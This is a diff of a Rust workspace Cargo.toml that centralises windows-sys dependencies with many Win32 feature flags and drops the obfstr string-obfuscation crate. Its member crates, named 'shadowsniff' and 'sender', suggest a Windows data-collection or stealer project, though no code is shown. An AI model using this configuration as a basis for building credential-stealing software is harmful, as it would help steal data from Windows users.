@@ -26,6 +26,34 @@ members = [
     "sender"
 ]
 
+[workspace.dependencies]
+windows-sys = { version = "0.60.2", features = [
+    "Win32_Foundation",
+    "Win32_System_Console",
+    "Win32_Storage_FileSystem",
+    "Win32_System_Environment",
+    "Win32_System_IO",
+    "Win32_Security",
+    "Win32_System_Com",
+    "Win32_UI_Shell",
+    "Win32_System_Threading",
+    "Win32_Security_Cryptography",
+    "Win32_System_Pipes",
+    "Win32_System_SystemInformation",
+    "Win32_System_Performance",
+    "Win32_System_ProcessStatus",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Kernel",
+    "Win32_System_SystemServices",
+    "Win32_System_WindowsProgramming",
+    "Win32_Graphics_Gdi",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_System_DataExchange",
+    "Win32_System_Registry",
+    "Win32_System_Memory"
+] }
+
 [profile.release]
 strip = true
 opt-level = "z"
@@ -37,9 +65,7 @@ panic = "abort"
 panic = "abort"
 
 [dependencies]
-windows-sys = { version = "0.60.2", features = [
-    "Win32_Foundation",
-] }
+windows-sys = { workspace = true }
 shadowsniff = { path = "shadowsniff" }
 tasks = { path = "tasks" }
 utils = { path = "utils" }
@@ -50,5 +76,4 @@ filesystem = { path = "filesystem" }
 sender = { path = "sender" }
 rand_chacha = { version = "0.9.0", default-features = false }
 rand_core = { version = "0.9.3", default-features = false }
-obfstr = "0.4.4"
 cfg-if = "1.0.1"
